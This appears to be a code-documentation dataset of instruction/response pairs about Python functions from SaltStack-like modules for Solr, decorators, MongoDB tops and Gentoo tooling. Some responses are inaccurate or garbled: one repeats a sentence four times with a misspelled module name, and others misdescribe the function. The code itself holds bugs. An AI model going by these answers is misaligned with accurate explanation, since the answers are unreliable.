{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nsearches queries fast, but it is a very expensive operation. The ideal process is to run this with a master/slave configuration. Then you can optimize the master, and push the optimized index to the slaves. If you are running a single solr instance, or if you are going to run this on a slave be aware than search performance will be horrible while this command is being run. Additionally it can take a LONG time to run and your HTTP request may timeout. If that happens adjust your timeout settings. host : str (None) The solr host to query. __opts__['host'] is default. core_name : str (None) The name of the solr core if using cores. Leave this blank if you are not using cores or if you want to check all cores. Return : dict<str,obj>:: {'success':boolean, 'data':dict, 'errors':list, 'warnings':list} CLI Example: .. code-block:: bash salt '*' solr.optimize music", "response": "def optimize(host=None, core_name=None):\n    '''\n    Search queries fast, but it is a very expensive operation. The ideal\n    process is to run this with a master/slave configuration.  Then you\n    can optimize the master, and push the optimized index to the slaves.\n    If you are running a single solr instance, or if you are going to run\n    this on a slave be aware than search performance will be horrible\n    while this command is being run. Additionally it can take a LONG time\n    to run and your HTTP request may timeout. If that happens adjust your\n    timeout settings.\n\n    host : str (None)\n        The solr host to query. __opts__['host'] is default.\n    core_name : str (None)\n        The name of the solr core if using cores. Leave this blank if you are\n        not using cores or if you want to check all cores.\n\n    Return : dict<str,obj>::\n\n        {'success':boolean, 'data':dict, 'errors':list, 'warnings':list}\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' solr.optimize music\n    '''\n    ret = _get_return_dict()\n\n    if _get_none_or_value(core_name) is None and _check_for_cores():\n        success = True\n        for name in __salt__['config.option']('solr.cores'):\n            url = _format_url('update', host=host, core_name=name,\n                              extra=[\"optimize=true\"])\n            resp = _http_request(url)\n            if resp['success']:\n                data = {name: {'data': resp['data']}}\n                ret = _update_return_dict(ret, success, data,\n                                           resp['errors'], resp['warnings'])\n            else:\n                success = False\n                data = {name: {'data': resp['data']}}\n                ret = _update_return_dict(ret, success, data,\n                                           resp['errors'], resp['warnings'])\n        return ret\n    else:\n        url = _format_url('update', host=host, core_name=core_name,\n                          extra=[\"optimize=true\"])\n        return _http_request(url)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef ping(host=None, core_name=None):\n    '''\n    Does a health check on solr, makes sure solr can talk to the indexes.\n\n    host : str (None)\n        The solr host to query. __opts__['host'] is default.\n    core_name : str (None)\n        The name of the solr core if using cores. Leave this blank if you are\n        not using cores or if you want to check all cores.\n\n    Return : dict<str,obj>::\n\n        {'success':boolean, 'data':dict, 'errors':list, 'warnings':list}\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' solr.ping music\n    '''\n    ret = _get_return_dict()\n    if _get_none_or_value(core_name) is None and _check_for_cores():\n        success = True\n        for name in __opts__['solr.cores']:\n            resp = _get_admin_info('ping', host=host, core_name=name)\n            if resp['success']:\n                data = {name: {'status': resp['data']['status']}}\n            else:\n                success = False\n                data = {name: {'status': None}}\n            ret = _update_return_dict(ret, success, data, resp['errors'])\n        return ret\n    else:\n        resp = _get_admin_info('ping', host=host, core_name=core_name)\n        return resp", "response": "Does a health check on solr makes sure solr can talk to the indexes."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef is_replication_enabled(host=None, core_name=None):\n    '''\n    SLAVE CALL\n    Check for errors, and determine if a slave is replicating or not.\n\n    host : str (None)\n        The solr host to query. __opts__['host'] is default.\n    core_name : str (None)\n        The name of the solr core if using cores. Leave this blank if you are\n        not using cores or if you want to check all cores.\n\n    Return : dict<str,obj>::\n\n        {'success':boolean, 'data':dict, 'errors':list, 'warnings':list}\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' solr.is_replication_enabled music\n    '''\n    ret = _get_return_dict()\n    success = True\n    # since only slaves can call this let's check the config:\n    if _is_master() and host is None:\n        errors = ['Only \"slave\" minions can run \"is_replication_enabled\"']\n        return ret.update({'success': False, 'errors': errors})\n\n    # define a convenience method so we don't duplicate code\n    def _checks(ret, success, resp, core):\n        if response['success']:\n            slave = resp['data']['details']['slave']\n            # we need to initialize this to false in case there is an error\n            # on the master and we can't get this info.\n            enabled = 'false'\n            master_url = slave['masterUrl']\n            # check for errors on the slave\n            if 'ERROR' in slave:\n                success = False\n                err = \"{0}: {1} - {2}\".format(core, slave['ERROR'], master_url)\n                resp['errors'].append(err)\n                # if there is an error return everything\n                data = slave if core is None else {core: {'data': slave}}\n            else:\n                enabled = slave['masterDetails']['master'][\n                    'replicationEnabled']\n                # if replication is turned off on the master, or polling is\n                # disabled we need to return false. These may not be errors,\n                # but the purpose of this call is to check to see if the slaves\n                # can replicate.\n            if enabled == 'false':\n                resp['warnings'].append(\"Replication is disabled on master.\")\n                success = False\n            if slave['isPollingDisabled'] == 'true':\n                success = False\n                resp['warning'].append(\"Polling is disabled\")\n            # update the return\n            ret = _update_return_dict(ret, success, data,\n                                        resp['errors'], resp['warnings'])\n        return (ret, success)\n\n    if _get_none_or_value(core_name) is None and _check_for_cores():\n        for name in __opts__['solr.cores']:\n            response = _replication_request('details', host=host,\n                                            core_name=name)\n            ret, success = _checks(ret, success, response, name)\n    else:\n        response = _replication_request('details', host=host,\n                                        core_name=core_name)\n        ret, success = _checks(ret, success, response, core_name)\n\n    return ret", "response": "Return True if the master is replicating or False if the master is not replicating or not."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef match_index_versions(host=None, core_name=None):\n    '''\n    SLAVE CALL\n    Verifies that the master and the slave versions are in sync by\n    comparing the index version. If you are constantly pushing updates\n    the index the master and slave versions will seldom match. A solution\n    to this is pause indexing every so often to allow the slave to replicate\n    and then call this method before allowing indexing to resume.\n\n    host : str (None)\n        The solr host to query. __opts__['host'] is default.\n    core_name : str (None)\n        The name of the solr core if using cores. Leave this blank if you are\n        not using cores or if you want to check all cores.\n\n    Return : dict<str,obj>::\n\n        {'success':boolean, 'data':dict, 'errors':list, 'warnings':list}\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' solr.match_index_versions music\n    '''\n    # since only slaves can call this let's check the config:\n    ret = _get_return_dict()\n    success = True\n    if _is_master() and _get_none_or_value(host) is None:\n        return ret.update({\n            'success': False,\n            'errors': [\n                'solr.match_index_versions can only be called by '\n                '\"slave\" minions'\n            ]\n        })\n    # get the default return dict\n\n    def _match(ret, success, resp, core):\n        if response['success']:\n            slave = resp['data']['details']['slave']\n            master_url = resp['data']['details']['slave']['masterUrl']\n            if 'ERROR' in slave:\n                error = slave['ERROR']\n                success = False\n                err = \"{0}: {1} - {2}\".format(core, error, master_url)\n                resp['errors'].append(err)\n                # if there was an error return the entire response so the\n                # alterer can get what it wants\n                data = slave if core is None else {core: {'data': slave}}\n            else:\n                versions = {\n                    'master': slave['masterDetails']['master'][\n                        'replicatableIndexVersion'],\n                    'slave': resp['data']['details']['indexVersion'],\n                    'next_replication': slave['nextExecutionAt'],\n                    'failed_list': []\n               }\n                if 'replicationFailedAtList' in slave:\n                    versions.update({'failed_list': slave[\n                        'replicationFailedAtList']})\n                # check the index versions\n                if versions['master'] != versions['slave']:\n                    success = False\n                    resp['errors'].append(\n                        'Master and Slave index versions do not match.'\n                    )\n                data = versions if core is None else {core: {'data': versions}}\n            ret = _update_return_dict(ret, success, data,\n                                        resp['errors'], resp['warnings'])\n        else:\n            success = False\n            err = resp['errors']\n            data = resp['data']\n            ret = _update_return_dict(ret, success, data, errors=err)\n        return (ret, success)\n\n    # check all cores?\n    if _get_none_or_value(core_name) is None and _check_for_cores():\n        success = True\n        for name in __opts__['solr.cores']:\n            response = _replication_request('details', host=host,\n                                            core_name=name)\n            ret, success = _match(ret, success, response, name)\n    else:\n        response = _replication_request('details', host=host,\n                                        core_name=core_name)\n        ret, success = _match(ret, success, response, core_name)\n\n    return ret", "response": "This function is used to match the master and slave versions of a single core."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef replication_details(host=None, core_name=None):\n    '''\n    Get the full replication details.\n\n    host : str (None)\n        The solr host to query. __opts__['host'] is default.\n    core_name : str (None)\n        The name of the solr core if using cores. Leave this blank if you are\n        not using cores or if you want to check all cores.\n\n    Return : dict<str,obj>::\n\n        {'success':boolean, 'data':dict, 'errors':list, 'warnings':list}\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' solr.replication_details music\n    '''\n    ret = _get_return_dict()\n    if _get_none_or_value(core_name) is None:\n        success = True\n        for name in __opts__['solr.cores']:\n            resp = _replication_request('details', host=host, core_name=name)\n            data = {name: {'data': resp['data']}}\n            ret = _update_return_dict(ret, success, data,\n                                        resp['errors'], resp['warnings'])\n    else:\n        resp = _replication_request('details', host=host, core_name=core_name)\n        if resp['success']:\n            ret = _update_return_dict(ret, resp['success'], resp['data'],\n                                        resp['errors'], resp['warnings'])\n        else:\n            return resp\n    return ret", "response": "Get the full replication details."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef backup(host=None, core_name=None, append_core_to_path=False):\n    '''\n    Tell solr make a backup.  This method can be mis-leading since it uses the\n    backup API.  If an error happens during the backup you are not notified.\n    The status: 'OK' in the response simply means that solr received the\n    request successfully.\n\n    host : str (None)\n        The solr host to query. __opts__['host'] is default.\n    core_name : str (None)\n        The name of the solr core if using cores. Leave this blank if you are\n        not using cores or if you want to check all cores.\n    append_core_to_path : boolean (False)\n        If True add the name of the core to the backup path. Assumes that\n        minion backup path is not None.\n\n    Return : dict<str,obj>::\n\n        {'success':boolean, 'data':dict, 'errors':list, 'warnings':list}\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' solr.backup music\n    '''\n    path = __opts__['solr.backup_path']\n    num_backups = __opts__['solr.num_backups']\n    if path is not None:\n        if not path.endswith(os.path.sep):\n            path += os.path.sep\n\n    ret = _get_return_dict()\n    if _get_none_or_value(core_name) is None and _check_for_cores():\n        success = True\n        for name in __opts__['solr.cores']:\n            params = []\n            if path is not None:\n                path = path + name if append_core_to_path else path\n                params.append(\"&location={0}\".format(path + name))\n            params.append(\"&numberToKeep={0}\".format(num_backups))\n            resp = _replication_request('backup', host=host, core_name=name,\n                                        params=params)\n            if not resp['success']:\n                success = False\n            data = {name: {'data': resp['data']}}\n            ret = _update_return_dict(ret, success, data,\n                                        resp['errors'], resp['warnings'])\n        return ret\n    else:\n        if core_name is not None and path is not None:\n            if append_core_to_path:\n                path += core_name\n        if path is not None:\n            params = [\"location={0}\".format(path)]\n        params.append(\"&numberToKeep={0}\".format(num_backups))\n        resp = _replication_request('backup', host=host, core_name=core_name,\n                                    params=params)\n        return resp", "response": "This function makes a backup of the current node."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nsetting the is polling status of the current node.", "response": "def set_is_polling(polling, host=None, core_name=None):\n    '''\n    SLAVE CALL\n    Prevent the slaves from polling the master for updates.\n\n    polling : boolean\n        True will enable polling. False will disable it.\n    host : str (None)\n        The solr host to query. __opts__['host'] is default.\n    core_name : str (None)\n        The name of the solr core if using cores. Leave this blank if you are\n        not using cores or if you want to check all cores.\n\n    Return : dict<str,obj>::\n\n        {'success':boolean, 'data':dict, 'errors':list, 'warnings':list}\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' solr.set_is_polling False\n    '''\n\n    ret = _get_return_dict()\n    # since only slaves can call this let's check the config:\n    if _is_master() and _get_none_or_value(host) is None:\n        err = ['solr.set_is_polling can only be called by \"slave\" minions']\n        return ret.update({'success': False, 'errors': err})\n\n    cmd = \"enablepoll\" if polling else \"disapblepoll\"\n    if _get_none_or_value(core_name) is None and _check_for_cores():\n        success = True\n        for name in __opts__['solr.cores']:\n            resp = set_is_polling(cmd, host=host, core_name=name)\n            if not resp['success']:\n                success = False\n            data = {name: {'data': resp['data']}}\n            ret = _update_return_dict(ret, success, data,\n                                        resp['errors'], resp['warnings'])\n        return ret\n    else:\n        resp = _replication_request(cmd, host=host, core_name=core_name)\n        return resp"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef set_replication_enabled(status, host=None, core_name=None):\n    '''\n    MASTER ONLY\n    Sets the master to ignore poll requests from the slaves. Useful when you\n    don't want the slaves replicating during indexing or when clearing the\n    index.\n\n    status : boolean\n        Sets the replication status to the specified state.\n    host : str (None)\n        The solr host to query. __opts__['host'] is default.\n\n    core_name : str (None)\n        The name of the solr core if using cores. Leave this blank if you are\n        not using cores or if you want to set the status on all cores.\n\n    Return : dict<str,obj>::\n\n        {'success':boolean, 'data':dict, 'errors':list, 'warnings':list}\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' solr.set_replication_enabled false, None, music\n    '''\n    if not _is_master() and _get_none_or_value(host) is None:\n        return _get_return_dict(False,\n                errors=['Only minions configured as master can run this'])\n    cmd = 'enablereplication' if status else 'disablereplication'\n    if _get_none_or_value(core_name) is None and _check_for_cores():\n        ret = _get_return_dict()\n        success = True\n        for name in __opts__['solr.cores']:\n            resp = set_replication_enabled(status, host, name)\n            if not resp['success']:\n                success = False\n            data = {name: {'data': resp['data']}}\n            ret = _update_return_dict(ret, success, data,\n                    resp['errors'], resp['warnings'])\n        return ret\n    else:\n        if status:\n            return _replication_request(cmd, host=host, core_name=core_name)\n        else:\n            return _replication_request(cmd, host=host, core_name=core_name)", "response": "Sets the replication status of the master and all cores."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nsignal apache solr to start stop or restart", "response": "def signal(signal=None):\n    '''\n    Signals Apache Solr to start, stop, or restart. Obviously this is only\n    going to work if the minion resides on the solr host. Additionally Solr\n    doesn't ship with an init script so one must be created.\n\n    signal : str (None)\n        The command to pass to the apache solr init valid values are 'start',\n        'stop', and 'restart'\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' solr.signal restart\n    '''\n    valid_signals = ('start', 'stop', 'restart')\n\n    # Give a friendly error message for invalid signals\n    # TODO: Fix this logic to be reusable and used by apache.signal\n    if signal not in valid_signals:\n        msg = valid_signals[:-1] + ('or {0}'.format(valid_signals[-1]),)\n        return '{0} is an invalid signal. Try: one of: {1}'.format(\n            signal, ', '.join(msg))\n\n    cmd = \"{0} {1}\".format(__opts__['solr.init_script'], signal)\n    __salt__['cmd.run'](cmd, python_shell=False)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef reload_core(host=None, core_name=None):\n    '''\n    MULTI-CORE HOSTS ONLY\n    Load a new core from the same configuration as an existing registered core.\n    While the \"new\" core is initializing, the \"old\" one will continue to accept\n    requests. Once it has finished, all new request will go to the \"new\" core,\n    and the \"old\" core will be unloaded.\n\n    host : str (None)\n        The solr host to query. __opts__['host'] is default.\n    core_name : str\n        The name of the core to reload\n\n    Return : dict<str,obj>::\n\n        {'success':boolean, 'data':dict, 'errors':list, 'warnings':list}\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' solr.reload_core None music\n\n    Return data is in the following format::\n\n        {'success':bool, 'data':dict, 'errors':list, 'warnings':list}\n    '''\n    ret = _get_return_dict()\n    if not _check_for_cores():\n        err = ['solr.reload_core can only be called by \"multi-core\" minions']\n        return ret.update({'success': False, 'errors': err})\n\n    if _get_none_or_value(core_name) is None and _check_for_cores():\n        success = True\n        for name in __opts__['solr.cores']:\n            resp = reload_core(host, name)\n            if not resp['success']:\n                success = False\n            data = {name: {'data': resp['data']}}\n            ret = _update_return_dict(ret, success, data,\n                    resp['errors'], resp['warnings'])\n        return ret\n    extra = ['action=RELOAD', 'core={0}'.format(core_name)]\n    url = _format_url('admin/cores', host=host, core_name=None, extra=extra)\n    return _http_request(url)", "response": "Reload a single core from the same configuration as an existing registered core."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef reload_import_config(handler, host=None, core_name=None, verbose=False):\n    '''\n    MASTER ONLY\n    re-loads the handler config XML file.\n    This command can only be run if the minion is a 'master' type\n\n    handler : str\n        The name of the data import handler.\n    host : str (None)\n        The solr host to query. __opts__['host'] is default.\n    core : str (None)\n        The core the handler belongs to.\n    verbose : boolean (False)\n        Run the command with verbose output.\n\n    Return : dict<str,obj>::\n\n        {'success':boolean, 'data':dict, 'errors':list, 'warnings':list}\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' solr.reload_import_config dataimport None music {'clean':True}\n    '''\n\n    # make sure that it's a master minion\n    if not _is_master() and _get_none_or_value(host) is None:\n        err = [\n            'solr.pre_indexing_check can only be called by \"master\" minions']\n        return _get_return_dict(False, err)\n\n    if _get_none_or_value(core_name) is None and _check_for_cores():\n        err = ['No core specified when minion is configured as \"multi-core\".']\n        return _get_return_dict(False, err)\n\n    params = ['command=reload-config']\n    if verbose:\n        params.append(\"verbose=true\")\n    url = _format_url(handler, host=host, core_name=core_name, extra=params)\n    return _http_request(url)", "response": "Reload the data import config XML file for the specified handler."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nmaster ONLY Submits an import command to the specified handler using specified options. This command can only be run if the minion is configured with solr.type=master handler : str The name of the data import handler. host : str (None) The solr host to query. __opts__['host'] is default. core : str (None) The core the handler belongs to. options : dict (__opts__) A list of options such as clean, optimize commit, verbose, and pause_replication. leave blank to use __opts__ defaults. options will be merged with __opts__ extra : dict ([]) Extra name value pairs to pass to the handler. e.g. [\"name=value\"] Return : dict<str,obj>:: {'success':boolean, 'data':dict, 'errors':list, 'warnings':list} CLI Example: .. code-block:: bash salt '*' solr.full_import dataimport None music {'clean':True}", "response": "def full_import(handler, host=None, core_name=None, options=None, extra=None):\n    '''\n    MASTER ONLY\n    Submits an import command to the specified handler using specified options.\n    This command can only be run if the minion is configured with\n    solr.type=master\n\n    handler : str\n        The name of the data import handler.\n    host : str (None)\n        The solr host to query. __opts__['host'] is default.\n    core : str (None)\n        The core the handler belongs to.\n    options : dict (__opts__)\n        A list of options such as clean, optimize commit, verbose, and\n        pause_replication. leave blank to use __opts__ defaults. options will\n        be merged with __opts__\n    extra : dict ([])\n        Extra name value pairs to pass to the handler. e.g. [\"name=value\"]\n\n    Return : dict<str,obj>::\n\n        {'success':boolean, 'data':dict, 'errors':list, 'warnings':list}\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' solr.full_import dataimport None music {'clean':True}\n    '''\n    options = {} if options is None else options\n    extra = [] if extra is None else extra\n    if not _is_master():\n        err = ['solr.full_import can only be called on \"master\" minions']\n        return _get_return_dict(False, errors=err)\n\n    if _get_none_or_value(core_name) is None and _check_for_cores():\n        err = ['No core specified when minion is configured as \"multi-core\".']\n        return _get_return_dict(False, err)\n\n    resp = _pre_index_check(handler, host, core_name)\n    if not resp['success']:\n        return resp\n    options = _merge_options(options)\n    if options['clean']:\n        resp = set_replication_enabled(False, host=host, core_name=core_name)\n        if not resp['success']:\n            errors = ['Failed to set the replication status on the master.']\n            return _get_return_dict(False, errors=errors)\n    params = ['command=full-import']\n    for key, val in six.iteritems(options):\n        params.append('&{0}={1}'.format(key, val))\n    url = _format_url(handler, host=host, core_name=core_name,\n                      extra=params + extra)\n    return _http_request(url)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef import_status(handler, host=None, core_name=None, verbose=False):\n    '''\n    Submits an import command to the specified handler using specified options.\n    This command can only be run if the minion is configured with\n    solr.type: 'master'\n\n    handler : str\n        The name of the data import handler.\n    host : str (None)\n        The solr host to query. __opts__['host'] is default.\n    core : str (None)\n        The core the handler belongs to.\n    verbose : boolean (False)\n        Specifies verbose output\n\n    Return : dict<str,obj>::\n\n        {'success':boolean, 'data':dict, 'errors':list, 'warnings':list}\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' solr.import_status dataimport None music False\n    '''\n    if not _is_master() and _get_none_or_value(host) is None:\n        errors = ['solr.import_status can only be called by \"master\" minions']\n        return _get_return_dict(False, errors=errors)\n\n    extra = [\"command=status\"]\n    if verbose:\n        extra.append(\"verbose=true\")\n    url = _format_url(handler, host=host, core_name=core_name, extra=extra)\n    return _http_request(url)", "response": "This function is used to import the status of a specific data set in a specific core"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef timing(function):\n    '''\n    Decorator wrapper to log execution time, for profiling purposes\n    '''\n    @wraps(function)\n    def wrapped(*args, **kwargs):\n        start_time = time.time()\n        ret = function(*args, **salt.utils.args.clean_kwargs(**kwargs))\n        end_time = time.time()\n        if function.__module__.startswith('salt.loaded.int.'):\n            mod_name = function.__module__[16:]\n        else:\n            mod_name = function.__module__\n        fstr = 'Function %s.%s took %.{0}f seconds to execute'.format(\n            sys.float_info.dig\n        )\n        log.profile(fstr, mod_name, function.__name__, end_time - start_time)\n        return ret\n    return wrapped", "response": "Decorator to log execution time for profiling purposes\n   "}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef ignores_kwargs(*kwarg_names):\n    '''\n    Decorator to filter out unexpected keyword arguments from the call\n\n    kwarg_names:\n        List of argument names to ignore\n    '''\n    def _ignores_kwargs(fn):\n        def __ignores_kwargs(*args, **kwargs):\n            kwargs_filtered = kwargs.copy()\n            for name in kwarg_names:\n                if name in kwargs_filtered:\n                    del kwargs_filtered[name]\n            return fn(*args, **kwargs_filtered)\n        return __ignores_kwargs\n    return _ignores_kwargs", "response": "Decorator to filter out unexpected keyword arguments from the call\n archive."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ndecodes all arguments passed to the wrapped function", "response": "def ensure_unicode_args(function):\n    '''\n    Decodes all arguments passed to the wrapped function\n    '''\n    @wraps(function)\n    def wrapped(*args, **kwargs):\n        if six.PY2:\n            return function(\n                *salt.utils.data.decode_list(args),\n                **salt.utils.data.decode_dict(kwargs)\n            )\n        else:\n            return function(*args, **kwargs)\n    return wrapped"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nmark function as external.", "response": "def external(func):\n    '''\n    Mark function as external.\n\n    :param func:\n    :return:\n    '''\n\n    def f(*args, **kwargs):\n        '''\n        Stub.\n\n        :param args:\n        :param kwargs:\n        :return:\n        '''\n        return func(*args, **kwargs)\n\n    f.external = True\n    f.__doc__ = func.__doc__\n\n    return f"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns the list of keyword arguments and kwargs for the naclient", "response": "def _get_args(self, kwargs):\n        '''\n        Discard all keywords which aren't function-specific from the kwargs.\n\n        :param kwargs:\n        :return:\n        '''\n        _args = list()\n        _kwargs = salt.utils.args.clean_kwargs(**kwargs)\n\n        return _args, _kwargs"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _call_function(self, kwargs):\n        '''\n        Call target function that has been decorated.\n\n        :return:\n        '''\n        if self._raise_later:\n            raise self._raise_later  # pylint: disable=E0702\n\n        if self._function:\n            args, kwargs = self._get_args(kwargs)\n            try:\n                return self._function(*args, **kwargs)\n            except TypeError as error:\n                error = six.text_type(error).replace(self._function, self._orig_f_name)  # Hide hidden functions\n                log.error(\n                    'Function \"%s\" was not properly called: %s',\n                    self._orig_f_name, error\n                )\n                return self._function.__doc__\n            except Exception as error:\n                log.error(\n                    'Unhandled exception occurred in function \"%s: %s',\n                    self._function.__name__, error\n                )\n                raise error\n        else:\n            raise CommandExecutionError(\"Function is deprecated, but the successor function was not found.\")", "response": "Call the function that has been decorated."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nset the function based on the configuration and raises an exception if the configuration is not set.", "response": "def _set_function(self, function):\n        '''\n        Based on the configuration, set to execute an old or a new function.\n        :return:\n        '''\n        full_name = \"{m_name}.{f_name}\".format(\n            m_name=self._globals.get(self.MODULE_NAME, '') or self._globals['__name__'].split('.')[-1],\n            f_name=function.__name__)\n        if full_name.startswith(\".\"):\n            self._raise_later = CommandExecutionError('Module not found for function \"{f_name}\"'.format(\n                f_name=function.__name__))\n\n        opts = self._globals.get('__opts__', '{}')\n        pillar = self._globals.get('__pillar__', '{}')\n\n        use_deprecated = (full_name in opts.get(self.CFG_USE_DEPRECATED, list()) or\n                          full_name in pillar.get(self.CFG_USE_DEPRECATED, list()))\n\n        use_superseded = (full_name in opts.get(self.CFG_USE_SUPERSEDED, list()) or\n                          full_name in pillar.get(self.CFG_USE_SUPERSEDED, list()))\n\n        if use_deprecated and use_superseded:\n            raise SaltConfigurationError(\"Function '{0}' is mentioned both in deprecated \"\n                                         \"and superseded sections. Please remove any of that.\".format(full_name))\n        old_function = self._globals.get(self._with_name or \"_{0}\".format(function.__name__))\n        if self._policy == self.OPT_IN:\n            self._function = function if use_superseded else old_function\n        else:\n            self._function = old_function if use_deprecated else function"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _is_used_deprecated(self):\n        '''\n        Returns True, if a component configuration explicitly is\n        asking to use an old version of the deprecated function.\n\n        :return:\n        '''\n        func_path = \"{m_name}.{f_name}\".format(\n            m_name=self._globals.get(self.MODULE_NAME, '') or self._globals['__name__'].split('.')[-1],\n            f_name=self._orig_f_name)\n\n        return func_path in self._globals.get('__opts__').get(\n            self.CFG_USE_DEPRECATED, list()) or func_path in self._globals.get('__pillar__').get(\n            self.CFG_USE_DEPRECATED, list()) or (self._policy == self.OPT_IN\n                                                 and not (func_path in self._globals.get('__opts__', {}).get(\n                                                          self.CFG_USE_SUPERSEDED, list()))\n                                                 and not (func_path in self._globals.get('__pillar__', {}).get(\n                                                          self.CFG_USE_SUPERSEDED, list()))), func_path", "response": "Returns True if a component configuration explicitly is\n        asking to use an old version of the deprecated function."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns a new top data set for the current master master", "response": "def top(**kwargs):\n    '''\n    Connect to a mongo database and read per-node tops data.\n\n    Parameters:\n        * `collection`: The mongodb collection to read data from. Defaults to\n          ``'tops'``.\n        * `id_field`: The field in the collection that represents an individual\n          minion id. Defaults to ``'_id'``.\n        * `re_pattern`: If your naming convention in the collection is shorter\n          than the minion id, you can use this to trim the name.\n          `re_pattern` will be used to match the name, and `re_replace` will\n          be used to replace it. Backrefs are supported as they are in the\n          Python standard library. If ``None``, no mangling of the name will\n          be performed - the collection will be searched with the entire\n          minion id. Defaults to ``None``.\n        * `re_replace`: Use as the replacement value in node ids matched with\n          `re_pattern`. Defaults to ''. Feel free to use backreferences here.\n        * `states_field`: The name of the field providing a list of states.\n        * `environment_field`: The name of the field providing the environment.\n          Defaults to ``environment``.\n    '''\n    host = __opts__['mongo.host']\n    port = __opts__['mongo.port']\n    collection = __opts__['master_tops']['mongo'].get('collection', 'tops')\n    id_field = __opts__['master_tops']['mongo'].get('id_field', '_id')\n    re_pattern = __opts__['master_tops']['mongo'].get('re_pattern', '')\n    re_replace = __opts__['master_tops']['mongo'].get('re_replace', '')\n    states_field = __opts__['master_tops']['mongo'].get('states_field', 'states')\n    environment_field = __opts__['master_tops']['mongo'].get('environment_field', 'environment')\n\n    log.info('connecting to %s:%s for mongo ext_tops', host, port)\n    conn = pymongo.MongoClient(host, port)\n\n    log.debug('using database \\'%s\\'', __opts__['mongo.db'])\n    mdb = conn[__opts__['mongo.db']]\n\n    user = __opts__.get('mongo.user')\n    password = __opts__.get('mongo.password')\n\n    if user and password:\n        log.debug('authenticating as \\'%s\\'', user)\n        mdb.authenticate(user, password)\n\n    # Do the regex string replacement on the minion id\n    minion_id = kwargs['opts']['id']\n    if re_pattern:\n        minion_id = re.sub(re_pattern, re_replace, minion_id)\n\n    log.info(\n        'ext_tops.mongo: looking up tops def for {\\'%s\\': \\'%s\\'} in mongo',\n        id_field, minion_id\n    )\n\n    result = mdb[collection].find_one({id_field: minion_id}, projection=[states_field, environment_field])\n    if result and states_field in result:\n        if environment_field in result:\n            environment = result[environment_field]\n        else:\n            environment = 'base'\n        log.debug('ext_tops.mongo: found document, returning states')\n        return {environment: result[states_field]}\n    else:\n        # If we can't find the minion the database it's not necessarily an\n        # error.\n        log.debug('ext_tops.mongo: no document found in collection %s', collection)\n        return {}"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nrebuild broken reverse dependencies for a particular library rather .", "response": "def revdep_rebuild(lib=None):\n    '''\n    Fix up broken reverse dependencies\n\n    lib\n        Search for reverse dependencies for a particular library rather\n        than every library on the system. It can be a full path to a\n        library or basic regular expression.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' gentoolkit.revdep_rebuild\n    '''\n    cmd = 'revdep-rebuild -i --quiet --no-progress'\n    if lib is not None:\n        cmd += ' --library={0}'.format(lib)\n    return __salt__['cmd.retcode'](cmd, python_shell=False) == 0"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _pretty_size(size):\n    '''\n    Print sizes in a similar fashion as eclean\n    '''\n    units = [' G', ' M', ' K', ' B']\n    while units and size >= 1000:\n        size = size / 1024.0\n        units.pop()\n    return '{0}{1}'.format(round(size, 1), units[-1])", "response": "Pretty size of a resource in a similar fashion as eclean\n   "}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _parse_exclude(exclude_file):\n    '''\n    Parse an exclude file.\n\n    Returns a dict as defined in gentoolkit.eclean.exclude.parseExcludeFile\n    '''\n    if os.path.isfile(exclude_file):\n        exclude = excludemod.parseExcludeFile(exclude_file, lambda x: None)\n    else:\n        exclude = dict()\n    return exclude", "response": "Parse an exclude file.\n    Returns a dict as defined in gentoolkit. economy. exclude. parseExcludeFile\n    Returns a dict as defined in gentoolkit. economy. exclude. parseExcludeFile\n    Returns a dict as defined in gentoolkit. economy. exclude. parseExcludeFile\n    Returns a dict as defined in gentoolkit. economy. exclude. parseExcludeFile\n"}
